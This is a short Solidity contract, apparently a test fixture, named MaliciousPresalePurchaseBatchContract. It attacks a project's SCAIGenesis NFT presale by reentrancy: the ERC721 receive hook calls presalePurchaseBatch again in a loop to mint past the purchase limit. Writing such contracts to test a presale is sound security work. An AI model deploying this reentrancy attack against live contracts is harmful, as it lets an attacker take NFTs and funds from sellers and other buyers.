//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.21;
import "./../SCAIGenesis.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MaliciousPresalePurchaseBatchContract is Ownable{

    SCAIGenesis scaiGen;
    SCAIGenesis.PrioritySaleCoupon coupon;
    bytes32 data;
    //mapping(uint=>Coupon) public CouponIndex;
    uint startIndex = 0;

    constructor(address _scaiGenAddress){
        scaiGen = SCAIGenesis(_scaiGenAddress);
    }

    function buyNFT(bytes32 r, bytes32 s, uint8 v)public payable{
        data = keccak256(abi.encode(address(this), 1, 5));
        coupon = SCAIGenesis.PrioritySaleCoupon({r:r, s:s, v:v});
        scaiGen.presalePurchaseBatch{value:msg.value}(coupon, 1, 5, 5);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external payable returns (bytes4){
        uint amount = scaiGen.mintPrice();
        for(uint i = 0; i < 4; i++){
            if(scaiGen.availableTokenCount() > 195){
                scaiGen.presalePurchaseBatch{value:msg.value}(coupon, 1, 5, 5);
            }
        }
        return this.onERC721Received.selector;
    }
    
    receive()external payable{}
}